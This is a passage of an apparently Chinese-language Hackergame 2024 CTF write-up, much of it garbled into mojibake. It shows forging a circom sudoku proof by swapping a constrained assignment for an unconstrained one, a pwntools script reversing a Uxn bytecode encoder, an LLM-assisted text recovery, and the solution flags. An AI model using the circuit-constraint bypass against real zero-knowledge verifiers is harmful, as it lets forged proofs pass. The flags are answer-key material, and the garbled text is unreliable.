ä¸€å¼€å§‹æˆ‘è¿˜æ²¡æœ‰ç†è§£è¿™æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œäºæ˜¯ç»§ç»­æœç´¢å’Œ circom æœ‰å…³çš„ä¿¡æ¯ï¼Œä¹‹åæ‰¾åˆ°äº†[è¿™ç¯‡æ–‡ç« ](https://sudoshreyansh.medium.com/understanding-constraints-in-circom-1749ae4c4515)ã€‚  
æ€»ç»“ä¸€ä¸‹å°±æ˜¯å¦‚æœä½¿ç”¨ `<--` è€Œä¸æ˜¯ `<==` æ¥èµ‹å€¼çš„è¯ï¼Œç”Ÿæˆçš„ verifier ä¸ä¼šæ£€æŸ¥è¿™æ¬¡èµ‹å€¼æ˜¯å¦æˆåŠŸã€‚  
ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘æŠŠè¿™ä¸€è¡Œæ”¹æˆ
```js
gt_zero_signals[i][j] <-- 1;
```
é‡æ–°ç¼–è¯‘ä¸€ä¸ª `sudoku.wasm` å¹¶ç”¨å®ƒæ¥ç”Ÿæˆä¸€ä¸ª `proof.json`ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–°çš„è¯æ˜ä»ç„¶èƒ½é€šè¿‡åŸæœ¬çš„ verifier çš„æ£€æŸ¥ã€‚

é‚£ä¹ˆåœ¨é’ˆå¯¹è¿™ä¸ªæ–°çš„ `wasm` çš„è¯æ˜é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ— è§†æ¯ä¸ªæ•°éƒ½éœ€è¦å¤§äº 0 è¿™ä¸ªæ¡ä»¶äº†ã€‚  
ä¸è¿‡ `IsValidInput()` è¿™ä¸ªæ£€æŸ¥è¿˜æ˜¯å­˜åœ¨çš„ã€‚é˜…è¯» `comparators.circom` å¯ä»¥å‘ç° `LessEqThan(4)` é™åˆ¶äº†è¾“å…¥éœ€è¦æ˜¯ä¸€ä¸ª 4 ä½äºŒè¿›åˆ¶æ•°ï¼Œä¸” `x + (1<<4) - 9` çš„ç¬¬ 5 ä½æ˜¯ 1ï¼Œæ‰€ä»¥åˆæ³•çš„è¾“å…¥èŒƒå›´æ˜¯ $[-6, 9]$ã€‚  
åˆå› ä¸º `SudokuChecker()` é‡Œä¼šæŠŠ `i==j` çš„æƒ…å†µèµ‹å€¼ä¸º 0ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥ä¸­ä¸èƒ½åŒ…æ‹¬ 0ï¼Œä½†è¿™ 15 ä¸ªä¸åŒçš„æ•°å·²ç»è¶³å¤Ÿæˆ‘ä»¬å¡«å‡ºä¸€ä¸ªæ•°ç‹¬äº†ã€‚  
æœ€ç»ˆæ„é€ çš„ `input.json` å¦‚ä¸‹ï¼šï¼ˆæ˜¯çš„æˆ‘æ˜¯æ‰‹å¡«çš„ solutionï¼‰

```python
s = """900000100
800000200
700000300
001000006
020000070
003000000
010000060
002000007
030000000"""
d["unsolved_grid"] = [[int(x) for x in y] for y in s.split("\n")]
d["solved_grid"] = [
    [ 9,  6, -1,  2,  5,  8,  1,  4, -2],
    [ 8,  5, -2,  1,  4,  7,  2, -1,  9],
    [ 7,  4, -3, -1,  6,  9,  3,  5,  8],
    [ 4,  7,  1,  9,  2,  5,  8,  3,  6],
    [ 5,  2,  8, -2,  3,  4,  9,  7,  1],
    [ 6,  9,  3,  7,  1, -1,  4, -2,  2],
    [-1,  1,  7,  4,  8,  3,  5,  6, -3],
    [-2,  8,  2,  5, -3,  1, -1,  9,  7],
    [-3,  3,  9,  6,  7,  2, -2,  8,  4],
]
with open("input2.json", "w") as f:
    json.dump(d, f)
```

**`flag{yOu_5h0wed_super_talent_in_sudoku_are_you_a_genius_e5492f1b78}`**


## ç¥ç§˜ä»£ç  2

> ä½œè€…æ•¢å†æŠŠ [documentation](https://wiki.xxiivv.com/site/uxntal_opcodes.html) å†™ä¹±ä¸€ç‚¹å—ğŸ˜¡

### ä½ å¥½ï¼Œ___ï¼ˆä¸‰ä¸ªå­—æ¯ï¼‰

æ ¹æ®æ”¶åˆ°çš„å­—èŠ‚ç å‰ç¼€é˜´å·®é˜³é”™çš„ç›´æ¥æœåˆ°äº†è¿™é—¨å« Uxn Tal çš„è¯­è¨€ã€‚ä½†æ˜¯ä»–çš„ documentation å†™çš„çœŸçš„æ˜¯å¤ªï¼ä¹±ï¼ï¼äº†ï¼ï¼ï¼  
è¿™å‘¨è¢« reading æ·¹æ²¡çš„æˆ‘å†³å®šè¿˜æ˜¯ä¸è¦è¯•å›¾å»ç†è§£è¿™ä¸ªå­—èŠ‚ç äº†...ç›´æ¥æµ‹è¯•å„ç§è¾“å…¥å¯¹è¾“å‡ºçš„å½±å“ã€‚  
è¯•äº†ä¸€åœˆå‘ç°æ¯ 3 ä¸ªå­—èŠ‚çš„è¾“å…¥å¯¹åº”çš„ 4 ä¸ªå­—èŠ‚çš„è¾“å‡ºæ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å°†è¾“å…¥çš„æ¯ 6 bit æ˜ å°„åˆ°ä¸€ä¸ªå­—èŠ‚ä¸Šäº†ã€‚  
äºæ˜¯ç›´æ¥éå†æ‰€æœ‰ 6 bit æ•°æŠŠæ˜ å°„åè¿‡æ¥å³å¯å‹ç¼©åçš„å†…å®¹ï¼Œè§£å‹å¾—åˆ° flagã€‚

å¦‚æœæƒ³è¿è¡Œä»¥ä¸‹ä»£ç çš„è¯è¯·è‡ªè¡ŒæŸ¥æ‰¾å¹¶å®‰è£… Uxn çš„è§£é‡Šå™¨ `uxncli`ã€‚

```python
import subprocess
import zlib
from pwn import *

r = remote("202.38.93.141", 32100)
r.recvline()
r.sendline(os.environ["TOKEN"].encode())

for _ in range(4):
    r.recvline()
r.sendline(b"1")
code = r.recvline().decode().strip()
target = r.recvline().decode().strip()

code = base64.b64decode(code)
with open("1.rom", "wb") as f:
    f.write(code)

def test(l):
    output = subprocess.Popen(
        ["uxn/uxncli", "1.rom", bytes(l)], stdout=subprocess.PIPE
    ).communicate()[0]
    return output.decode()

d = {}
for i in range(2**6):
    x = (i << 2) + 1
    ret = test([x])
    d[ret[0]] = i

b = b""
l = []
for c in target:
    if c not in d:
        l.append(0)
    else:
        l.append(d[c])
    if len(l) == 4:
        x = (l[0] << 18) | (l[1] << 12) | (l[2] << 6) | l[3]
        l = []
        b += x.to_bytes(3, "big")

print(zlib.decompress(b[:-1]).decode())
```

**`flag{Y0u_guessed_r1gh7!N0w_l34rn_uxn!!!_f729e337c3aa}`**


## å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€

> æˆ‘çš„ AI é¢˜ä¸å¯èƒ½è¿™ä¹ˆå¯çˆ±

### ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€

è¿™é¢˜ä¸€ä¸Šæ¥æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ª modified beam searchï¼ŒæŒ‰ç…§æ‰“ç çš„è§„åˆ™è¿›è¡Œå‰ªæã€‚  
ä½†æ˜¯åœ¨æˆ‘çš„ç¬”è®°æœ¬ä¸Šæ­ `llama_cpp_python` çš„ç¯å¢ƒä¹‹å‰æ‰è¿‡å¥½å‡ æ¬¡å‘ï¼Œç´¢æ€§çœ‹çœ‹èƒ½ä¸èƒ½æŠŠç¬¬ä¸€é—®çˆ†ç ´å‡ºæ¥ã€‚

[o1-preview åœ¨æ€è€ƒäº†æ•´æ•´ 1 åˆ†é’Ÿå](https://chatgpt.com/share/67305ad6-b17c-800d-9bef-a56687a06a81)ç›´æ¥ decode å‡ºæ¥äº†å‡ ä¹æ­£ç¡®çš„ç»“æœã€‚æˆ‘è‡ªå·±é˜…è¯»äº†ä¸€ä¸‹æ„Ÿè§‰å…¨æ–‡é€šé¡ºï¼Œä½†æ˜¯å“ˆå¸Œå°±æ˜¯å¯¹ä¸ä¸Šã€‚  
è¿”å·¥ç»™ o1-preview æ€è€ƒäº†å°†è¿‘ 2 åˆ†é’Ÿåä¾¿æŠŠ `race` æ”¹æˆäº† `game`ï¼ŒæˆåŠŸå¾—åˆ°æ­£ç¡®ç»“æœã€‚  
~~äº‹å®è¯æ˜å³ä½¿æ˜¯ LLM å¤šæ€è€ƒä¸€ä¼šä¹Ÿæ˜¯æœ‰ç›Šçš„~~

> In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The **game** was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.

**`flag{llm_lm_lm_koshitantan_fa7b655c38bc8847}`**

<!--# åè®°-->